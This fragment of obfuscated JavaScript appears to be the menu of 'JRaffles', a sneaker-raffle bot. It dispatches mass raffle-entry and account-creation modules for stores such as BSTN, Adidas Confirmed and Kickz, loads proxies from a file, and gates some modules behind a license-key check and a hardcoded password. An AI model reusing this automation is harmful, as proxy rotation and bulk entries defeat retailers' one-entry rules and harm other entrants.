                        console['log']('\x20(' + _0x2516a7 + ')\x20\x20[' + _0x365670[_0x2516a7]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x365670['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x365670['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x365670['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x365670['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x127184();
                if (taskModule > _0x365670['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4fda60(0x3e8), _0x5d04ee();
                if (_0x365670[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x5d617c = await _0x49cd47();
                            await _0x474d76['function'](_0x474d76, _0x5d617c);
                        }
                        if (taskFunction == 0x2) {
                            var _0x5d617c = await _0x49cd47(), _0x45fdad = _0x147d24['readFileSync']('pr.txt', 'utf-8')['split']('\x0a');
                            _0x5d617c = _0x45fdad['map']((_0x573db3, _0x2a04b6) => {
                                sanatizeProxy = _0x573db3['replace']('\x0d', '');
                                if (_0x45fdad[_0x2a04b6 + 0x1] != undefined)
                                    return '' + sanatizeProxy;
                                return '' + sanatizeProxy;
                            });
                            var _0x166bd8 = await _0xd08fc1(_0x474d76);
                            _0x255a87['shuffleTasks'] && await _0x18edf2(_0x166bd8), await _0x474d76['function'](_0x474d76, _0x166bd8, _0x5d617c);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5d617c = await _0x49cd47(), _0x166bd8 = await _0xd08fc1(_0x474d76);
                                _0x255a87['shuffleTasks'] && await _0x18edf2(_0x166bd8), await _0x474d76['function'](_0x474d76, _0x166bd8, _0x5d617c);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x5d617c = await _0x49cd47();
                                    await _0x474d76['function'](_0x474d76, _0x5d617c);
                                }
                            }
                        }
                    } catch (_0x1e25c3) {
                        console['log'](_0x1e25c3), await _0x4fda60(0x7d0);
                    }
                    return _0x5d04ee();
                }
                if (_0x365670[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                        var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5d617c = await _0x49cd47(), _0x5beb82 = await _0xd08fc1(_0x474d76);
                            _0x255a87['shuffleTasks'] && await _0x18edf2(_0x5beb82), await _0x474d76['function'](_0x474d76, _0x5beb82, _0x5d617c);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5d617c = await _0x49cd47(), _0x5beb82 = await _0xd08fc1(_0x474d76);
                                _0x255a87['shuffleTasks'] && await _0x18edf2(_0x5beb82), await _0x474d76['function'](_0x474d76, _0x5beb82, _0x5d617c);
                            }
                        }
                    } catch (_0x4d9134) {
                        console['log'](_0x4d9134), await _0x4fda60(0xfa0);
                    }
                    return _0x5d04ee();
                }
                if (_0x365670[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                        var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5d617c = await _0x49cd47(), _0x5beb82 = await _0xd08fc1(_0x474d76);
                            _0x255a87['shuffleTasks'] && await _0x18edf2(_0x5beb82), await _0x474d76['function'](_0x474d76, _0x5beb82, _0x5d617c);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5d617c = await _0x49cd47(), _0x5beb82 = await _0xd08fc1(_0x474d76);
                                _0x255a87['shuffleTasks'] && await _0x18edf2(_0x5beb82), await _0x474d76['function'](_0x474d76, _0x5beb82, _0x5d617c);
                            }
                        }
                    } catch (_0x36be2b) {
                        console['log'](_0x36be2b), await _0x4fda60(0xfa0);
                    }
                    return _0x5d04ee();
                }
                if (_0x365670[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x5d617c = await _0x49cd47();
                        return await _0x474d76['function'](_0x474d76, _0x5d617c), _0x5d04ee();
                    }
                    var _0x5d617c = await _0x49cd47(), _0x4fdbef = await _0xd08fc1(_0x474d76);
                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x4fdbef), await _0x474d76['function'](_0x474d76, _0x4fdbef, _0x5d617c), _0x5d04ee();
                }
                if (_0x365670[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5d617c = await _0x49cd47(), _0x4fdbef = await _0xd08fc1(_0x474d76);
                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x4fdbef), await _0x474d76['function'](_0x474d76, _0x4fdbef, _0x5d617c), _0x5d04ee();
                }
                if (_0x365670[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5d617c = await _0x49cd47(), _0x4fdbef = await _0xd08fc1(_0x474d76);
                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x4fdbef), await _0x474d76['function'](_0x474d76, _0x4fdbef, _0x5d617c), _0x5d04ee();
                }
                if (_0x365670[taskModule]['name']['includes']('BACKDOOR')) {
                    try {
                        let _0xfc0360 = { 'headers': { 'content-type': 'application/json' } }, _0x1a7f0c = { 'key': _0xcc4aaf }, _0x3d8a1a = await _0x3c935b['post']('https://jraffles.herokuapp.com/beta', _0x1a7f0c, _0xfc0360);
                        if (_0x3d8a1a['status'] != 0xc8)
                            throw new Error('No\x20Beta\x20Access..');
                        console['log']('Hello,\x20' + _0x3e3bb6['cyan'](_0x26c985) + '.\x20Beta\x20Access\x20Granted.'), await _0x4fda60(0x3e8);
                    } catch (_0x3dd2a5) {
                        return console['log']('No\x20Beta\x20Access.'), await _0x4fda60(0x7d0), _0x5d04ee();
                    }
                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction], _0x5d617c = await _0x49cd47(), _0x1bf99c = await _0xd08fc1(_0x474d76);
                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x1bf99c), await _0x474d76['function'](_0x474d76, _0x1bf99c, _0x5d617c), await _0x4fda60(0x1388), _0x5d04ee();
                }
                if (_0x365670[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5d617c = await _0x49cd47(), _0x4fdbef = await _0xd08fc1(_0x474d76);
                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x4fdbef), await _0x474d76['function'](_0x474d76, _0x4fdbef, _0x5d617c), _0x5d04ee();
                } else {
                    if (_0x365670[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                        var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x5d617c = await _0x49cd47(), _0x32bd38 = await _0xd08fc1(_0x474d76);
                            return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x32bd38), await _0x474d76['function'](_0x474d76, _0x32bd38, _0x5d617c), _0x5d04ee();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5d617c = await _0x49cd47();
                                return await _0x474d76['function'](_0x474d76, null, _0x5d617c), _0x5d04ee();
                            }
                        }
                        ;
                    } else {
                        if (_0x365670[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                            var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction], _0x5d617c = await _0x49cd47(), _0x1bf99c = await _0xd08fc1(_0x474d76);
                            return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x1bf99c), await _0x474d76['function'](_0x474d76, _0x1bf99c, _0x5d617c), await _0x4fda60(0x1388), _0x5d04ee();
                        } else {
                            if (_0x365670[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x58982a = { 'headers': { 'content-type': 'application/json' } }, _0x41f91e = { 'key': _0xcc4aaf }, _0x2ff525 = await _0x3c935b['post']('https://jraffles.herokuapp.com/beta', _0x41f91e, _0x58982a);
                                    if (_0x2ff525['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x3e3bb6['cyan'](_0x26c985) + '.\x20Beta\x20Access\x20Granted.'), await _0x4fda60(0x3e8);
                                } catch (_0x6aeffb) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x4fda60(0x7d0), _0x5d04ee();
                                }
                                taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction], _0x5d617c = await _0x49cd47(), _0x1bf99c = await _0xd08fc1(_0x474d76);
                                return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x1bf99c), await _0x474d76['function'](_0x474d76, _0x1bf99c, _0x5d617c), await _0x4fda60(0x1388), _0x5d04ee();
                            } else {
                                if (_0x365670[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x5d617c = await _0x49cd47(), _0x32bd38 = await _0xd08fc1(_0x474d76);
                                        return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x32bd38), await _0x474d76['function'](_0x474d76, _0x32bd38, _0x5d617c), _0x5d04ee();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x5d617c = await _0x49cd47();
                                            return await _0x474d76['function'](_0x474d76, null, _0x5d617c), _0x5d04ee();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x365670[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                        var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x474d76);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x365670[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                            var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5d617c = await _0x49cd47(), _0x1c8d49 = await _0xd08fc1(_0x474d76);
                                                return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x1c8d49), await _0x474d76['function'](_0x474d76, _0x1c8d49, _0x5d617c), _0x5d04ee();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5d617c = await _0x49cd47(), _0x1c8d49 = await _0xd08fc1(_0x474d76);
                                                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x1c8d49), await _0x474d76['function'](_0x474d76, _0x1c8d49, _0x5d617c), _0x5d04ee();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x365670[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                                var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5d617c = await _0x49cd47(), _0x5c0b9e = await _0xd08fc1(_0x474d76);
                                                    return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x5c0b9e), await _0x474d76['function'](_0x474d76, _0x5c0b9e, _0x5d617c), _0x5d04ee();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5d617c = await _0x49cd47(), _0x5c0b9e = await _0xd08fc1(_0x474d76);
                                                        return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x5c0b9e), await _0x474d76['function'](_0x474d76, _0x5c0b9e, _0x5d617c), _0x5d04ee();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x365670[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                                    var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5d617c = await _0x49cd47(), _0x408d82 = await _0xd08fc1(_0x474d76);
                                                        return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x408d82), await _0x474d76['function'](_0x474d76, _0x408d82, _0x5d617c), _0x5d04ee();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x5d617c = await _0x49cd47(), _0x408d82 = await _0xd08fc1(_0x474d76);
                                                            return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x408d82), await _0x474d76['function'](_0x474d76, _0x408d82, _0x5d617c), _0x5d04ee();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x365670[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                                        var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x5d617c = await _0x49cd47(), _0x408d82 = await _0xd08fc1(_0x474d76);
                                                            return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x408d82), await _0x474d76['function'](_0x474d76, _0x408d82, _0x5d617c), _0x5d04ee();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x5d617c = await _0x49cd47(), _0x408d82 = await _0xd08fc1(_0x474d76);
                                                                return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x408d82), await _0x474d76['function'](_0x474d76, _0x408d82, _0x5d617c), _0x5d04ee();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x365670[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                                            var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x5d617c = await _0x49cd47(), _0x16fc1e = await _0xd08fc1(_0x474d76);
                                                                return _0x255a87['shuffleTasks'] && await _0x18edf2(_0x16fc1e), await _0x474d76['function'](_0x16fc1e, _0x5d617c), _0x5d04ee();
                                                            }
                                                        } else {
                                                            if (_0x365670[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x4fda60(0x3e8), _0x5d04ee();
                                                            else {
                                                                if (_0x365670[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x2fe8ec = _0x365670[taskModule]['name'], _0x5d617c = await _0x49cd47();
                                                                    return await _0x9ecd61(_0x2fe8ec, _0x5d617c), _0x5d04ee();
                                                                } else {
                                                                    if (_0x365670[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x15c36e(_0x365670[taskModule]['modules']);
                                                                        var _0x474d76 = _0x365670[taskModule]['modules'][taskFunction];
                                                                        return await _0x474d76['function'](_0x474d76), _0x5d04ee();
                                                                    } else {
                                                                        if (_0x365670[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x583fee = 0x0;
                                                                            for (const _0x548c22 in _0x255a87) {
                                                                                console['log']('(' + _0x583fee + ')\x20' + _0x548c22 + '\x20:\x20' + _0x255a87[_0x548c22]), _0x583fee++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x583fee + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x1752c1 = await _0x3a0959();
                                                                            if (_0x1752c1 == _0x583fee)
                                                                                return _0x5d04ee();
                                                                            console['clear'];
                                                                            var _0x1f2dbf = 0x0;
                                                                            for (var _0x312104 in _0x255a87) {
                                                                                if (_0x1752c1 == _0x1f2dbf) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x312104 + '\x20:'), _0x255a87[_0x312104] = await _0x393de4(), _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87));
                                                                                    break;
                                                                                } else
                                                                                    _0x1f2dbf++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x4fda60(0xbb8), _0x5d04ee();
                                                                        } else {
                                                                            if (_0x365670[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0xd029e6(), _0x5d04ee();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x365670[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x2de994 = await _0x20b752();
                                                                                    _0x2de994 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x2b7c6e(), await afewFunction(_0x12f0a8[_0x3f3d59], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4fda60(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x5d04ee();
            } catch (_0x2e4d9) {
                return console['log'](_0x2e4d9), await _0x4fda60(0x2710), _0x5d04ee();
            }
        } catch (_0x2bdd6a) {
            return console['log'](_0x2bdd6a), await _0x4fda60(0x3a98);
        }
}
;
_0xf5e41e('JRaffles\x20' + _0x1ad228);
try {
    _0xd029e6(), _0x26cd33();
} catch (_0x2f0f85) {
    console['log'](_0x2f0f85);
}